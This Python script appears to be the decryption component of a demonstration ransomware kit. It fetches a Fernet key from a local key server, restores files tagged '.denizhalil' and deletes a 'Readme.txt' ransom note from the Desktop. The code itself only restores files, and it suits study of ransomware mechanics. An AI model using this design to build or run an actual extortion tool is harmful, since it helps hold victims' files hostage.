import gc
import socket
import json
import os
import logging
from cryptography.fernet import Fernet, InvalidToken
import argparse

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

class Decoder:
    def __init__(self, directory, server_host, server_port):
        self.directory = directory
        self.server_host = server_host
        self.server_port = server_port

    def decrypt_file(self, file_path, key):
        fernet = Fernet(key)
        try:
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = fernet.decrypt(encrypted_data)
        except InvalidToken:
            logging.error(f"Invalid key or corrupted file: {file_path}")
            return

        original_file_path = file_path.replace(".denizhalil", "")
        with open(original_file_path, 'wb') as file:
            file.write(decrypted_data)

        os.remove(file_path)
        logging.info(f"Decrypted and removed: {file_path}")

    def find_and_decrypt_files(self, key):
        for root, _, files in os.walk(self.directory):
            for file in files:
                if file.endswith(".denizhalil"):
                    file_path = os.path.join(root, file)
                    self.decrypt_file(file_path, key)

    def request_key_from_server(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server_host, self.server_port))
                s.sendall(json.dumps({'request': 'key'}).encode())
                data = s.recv(1024)
                response = json.loads(data.decode())
                return response.get('key')
        except (socket.error, json.JSONDecodeError) as e:
            logging.error(f"Failed to get key from server: {e}")
            return None

    def delete_readme(self):
        desktop_path = os.path.join(os.path.expanduser("~"), 'Desktop')
        readme_path = os.path.join(desktop_path, 'Readme.txt')

        if os.path.exists(readme_path):
            os.remove(readme_path)
            logging.info("Readme.txt deleted from desktop.")

    def clear_memory(self):
        gc.collect()
        logging.info("Memory cleared.")

def main():
    parser = argparse.ArgumentParser(description="File decryption utility.")
    parser.add_argument("--dir", default="dosyalar/", help="Directory to scan and decrypt files")
    args = parser.parse_args()

    server_host = '127.0.0.1'
    server_port = 12345
    logging.info("Waiting for key from server...")

    decoder = Decoder(args.dir, server_host, server_port)

    try:
        key = decoder.request_key_from_server()
        if key:
            decoder.find_and_decrypt_files(key)
            logging.info("Files successfully decrypted.")
            decoder.delete_readme()
        else:
            logging.warning("Decryption key not received.")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")

    decoder.clear_memory()

if __name__ == "__main__":
    main()
